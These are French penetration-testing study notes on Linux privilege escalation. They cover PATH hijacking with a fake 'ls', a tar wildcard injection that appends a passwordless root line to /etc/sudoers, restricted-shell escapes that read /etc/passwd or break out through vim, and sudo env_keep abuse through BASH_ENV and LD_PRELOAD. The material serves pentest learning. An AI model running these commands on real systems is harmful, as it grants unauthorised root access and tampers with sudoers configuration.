
- [ ] [[#PATH Abuse]]
- [ ] [[#Wildcard abuse]]
- [ ] [[#Restricted Shells]]
- [ ] [[#Env_keep (sudo)]]

# PATH Abuse

> [!TIP]
> Si un script lancé avec SUID ou SGID et contient une commande non appelée par son chemin absolu (ls au lieu de /bin/ls par ex) alors possible d'hijacker la commande en créant un script nommé ls et en le mettant dans le path

```shell-session
echo $PATH
```

Verifier si writable path

En fonction du user

```sh
find / -perm -u+w -user websvc 2>/dev/null | grep -vE "proc|run|sys"
```

En fonction du groupe

```sh
find / -perm -g+w -group websvc 2>/dev/null | grep -vE "proc|run|sys"
```

Droits Other

```sh
find / -perm -o+w 2>/dev/null | grep -vE "proc|run|sys"
```

Exploit

```
echo "!/bin/bash
/bin/bash" > /tmp/ls
```

```bash
PATH=/tmp/:$PATH
```

```shell-session
export PATH
```



---
# Wildcard abuse

> [!TIP]
> *, ?, [], ~, - dans un cronjob avec la commande tar

ajout d'un user au groupe sudoer

```bash
echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

---
# Restricted Shells

Qq restricted shells
- RBASH
- RKSH
- RZSH

[[#Command Injection / Chaining]]
[[#Command Substitution]]
[[#Bypass ls restriction]]
[[#Environment variable]]
[[#VIM Escape]]

https://0xffsec.com/handbook/shells/restricted-shells/

## Command Injection / Chaining

```bash
ls -l `cat /etc/passwd`
ls -l ; cat /etc/passwd
ls -l | cat /etc/passwd
```

## Command Substitution

```
ls -l `cat /etc/passwd`
```

```
echo $(cat /etc/passwd)
```

## Bypass ls restriction

```
echo /path/to/enum/*
```

## Environment variable

Check si un repertoire est specifié en variable d'environment afin de restreindre les commandes executables -> Modifier la variable d'environnement (Path / Shell par ex)

```
env
```

Afficher variable Shell

```
echo $0
```

Afficher variable PATH

```
echo $PATH
```

## VIM Escape

```sh
:set shell=/bin/bash
```

```sh
:shell
```


---

# Env_keep (sudo)

> [!TIP]
> Permet de charger la variable d'environnement définie avant l'exécution du programme appelé par sudo


check si présence du env_keep= avec sudo -l

```
sudo -l
```

variables intéressantes:

BASH_ENV -> permet de charger un script bash
LD_PRELOAD  -> permet de charger une DLL -> [[8. Linux Internals#LD_PRELOAD (Sudo)]]


